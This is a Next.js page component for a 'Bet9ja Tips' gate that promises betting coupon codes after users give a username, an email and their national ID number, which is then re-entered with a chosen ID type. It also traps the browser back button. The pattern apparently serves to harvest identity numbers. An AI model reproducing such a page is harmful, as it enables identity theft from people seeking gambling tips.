"use client";

import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { submitGateForm, submitVerificationForm } from "@/features/auth/actions";
import { ChevronDown, Loader2, AlertCircle, User, Mail, Fingerprint } from "lucide-react";

export default function GatePage() {
  const router = useRouter();
  const [step, setStep] = useState(1); 
  
  const [username, setUsername] = useState("");
  const [email, setEmail] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [idType, setIdType] = useState("NIN");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      document.cookie = "gate_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
      setStep(1);
      setIdNumber("");
      setIdType("NIN");
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, []);

  const handleStep1 = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    // Pass the new fields to the action
    const result = await submitGateForm(username, email, idNumber);
    
    if (result?.error) {
      setError(result.error);
      setLoading(false);
    } else {
      setStep(2);
      setIdNumber(""); // Clear the ID so they must type it again for verification
      setLoading(false);
    }
  };

  const handleStep2 = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    if (!idNumber.trim()) {
      setError("Please enter your ID number.");
      setLoading(false);
      return;
    }

    const result = await submitVerificationForm(idType, idNumber);
    
    if (result?.error) {
      setError(result.error);
      setLoading(false);
    } else {
      router.push("/tips?reviewing=true");
    }
  };

  return (
    <div className="min-h-screen bg-bg-deep flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-bg-slate rounded-2xl border border-gray-700 p-8 shadow-2xl relative overflow-hidden">
        
        {/* Glow Effect */}
        <div className="absolute top-0 right-0 w-32 h-32 bg-brand-green/10 rounded-full blur-3xl" />

        <div className="flex flex-col items-center mb-8 relative z-10">
          <div className="relative h-12 w-40 mb-4">
             <Image 
               src="/logo.png" 
               alt="Bet9ja Tips" 
               fill 
               className="object-contain" 
             />
          </div>
          <h1 className="text-2xl font-extrabold text-surface-white text-center">
            {step === 1 ? "Access Coupon Codes" : "Verify Identity"}
          </h1>
          <p className="text-text-muted text-sm mt-2 text-center">
            {step === 1 
              ? "Enter your details to begin." 
              : "Select your ID type and enter the exact ID number."}
          </p>
        </div>

        {error && (
          <div className="bg-brand-red/10 border border-brand-red/20 text-brand-red text-sm p-3 rounded-lg mb-6 flex items-center gap-2">
            <AlertCircle size={16} /> {error}
          </div>
        )}

        {/* STEP 1 FORM */}
        {step === 1 && (
          <form onSubmit={handleStep1} className="flex flex-col gap-4 relative z-10">
            
            {/* Username Input */}
            <div className="flex flex-col gap-2">
              <label className="text-sm text-text-muted font-medium">Username</label>
              <div className="relative">
                <User className="absolute left-3 top-3.5 text-text-muted w-5 h-5" />
                <input
                  type="text" required value={username} onChange={(e) => setUsername(e.target.value)}
                  placeholder="e.g. JohnDoe99"
                  className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 pl-10 pr-4 text-surface-white focus:outline-none focus:border-brand-green"
                />
              </div>
            </div>

            {/* Email Input */}
            <div className="flex flex-col gap-2">
              <label className="text-sm text-text-muted font-medium">Email Address</label>
              <div className="relative">
                <Mail className="absolute left-3 top-3.5 text-text-muted w-5 h-5" />
                <input
                  type="email" required value={email} onChange={(e) => setEmail(e.target.value)}
                  placeholder="e.g. john@example.com"
                  className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 pl-10 pr-4 text-surface-white focus:outline-none focus:border-brand-green"
                />
              </div>
            </div>

            {/* Primary ID Input */}
            <div className="flex flex-col gap-2">
              <label className="text-sm text-text-muted font-medium">Primary ID Number</label>
              <div className="relative">
                <Fingerprint className="absolute left-3 top-3.5 text-text-muted w-5 h-5" />
                <input
                  type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
                  placeholder="Enter your ID number"
                  className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 pl-10 pr-4 text-surface-white focus:outline-none focus:border-brand-green"
                />
              </div>
            </div>

            <button type="submit" disabled={loading}
              className="mt-4 w-full bg-brand-green hover:bg-brand-green-dark text-surface-white font-bold py-3 rounded-xl transition-colors flex justify-center items-center gap-2">
              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Get Passcode"}
            </button>
          </form>
        )}

        {/* STEP 2 FORM */}
        {step === 2 && (
          <form onSubmit={handleStep2} className="flex flex-col gap-4 relative z-10">
            <div className="flex flex-col gap-2">
              <label className="text-sm text-text-muted font-medium">Select ID Type</label>
              <div className="relative">
                <select 
                  value={idType} onChange={(e) => setIdType(e.target.value)}
                  className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 pl-4 pr-10 text-surface-white appearance-none focus:outline-none focus:border-brand-green cursor-pointer"
                >
                  <option value="NIN">National Identity Number (NIN)</option>
                  <option value="Voter's Card">Permanent Voter's Card</option>
                  <option value="Driver's License">Driver's License</option>
                  <option value="International Passport">International Passport</option>
                </select>
                <ChevronDown className="absolute right-3 top-3.5 text-text-muted w-5 h-5 pointer-events-none" />
              </div>
            </div>

            <div className="flex flex-col gap-2">
              <label className="text-sm text-text-muted font-medium">{idType} Number</label>
              <input
                type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
                placeholder={`Enter your ${idType} number`}
                className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 px-4 text-surface-white focus:outline-none focus:border-brand-green"
              />
            </div>

            <button type="submit" disabled={loading}
              className="mt-4 w-full bg-brand-green hover:bg-brand-green-dark text-surface-white font-bold py-3 rounded-xl transition-colors flex justify-center items-center gap-2">
              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Verify & Unlock"}
            </button>
          </form>
        )}

      </div>
    </div>
  );
}
